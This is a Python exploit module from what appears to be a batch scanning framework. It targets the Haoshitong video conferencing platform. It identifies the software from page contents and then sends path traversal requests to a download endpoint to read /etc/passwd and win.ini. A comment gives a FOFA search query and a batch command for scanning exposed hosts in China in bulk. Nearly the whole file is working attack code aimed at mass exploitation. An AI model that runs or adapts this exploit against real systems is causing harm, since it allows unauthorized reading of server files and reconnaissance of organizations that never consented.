# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-14 14:01
import hashlib

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import *
from core.request.asynchttp import *


# fofa: "body=\"深圳银澎云计算有限公司\""
# python3 batch.py -m exploit.scripts.Meeting.Fsmeeting.unauth_readfile -cs -fs "app=\"好视通-视频会议\" && country=\"CN\""
# 好视通视频会议平台存在任意文件下载

class Script(BaseScript):
    name = 'Fsmeeting'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini',
                               '/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd']
        # 相关信息
        self.info = 'haoshitong-cloud-conference 任意文件读取'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '/resources/safe/des3.js' in text and 'resources/commonImage/favicon.ico' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if 'extensions' in text or 'root:x' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass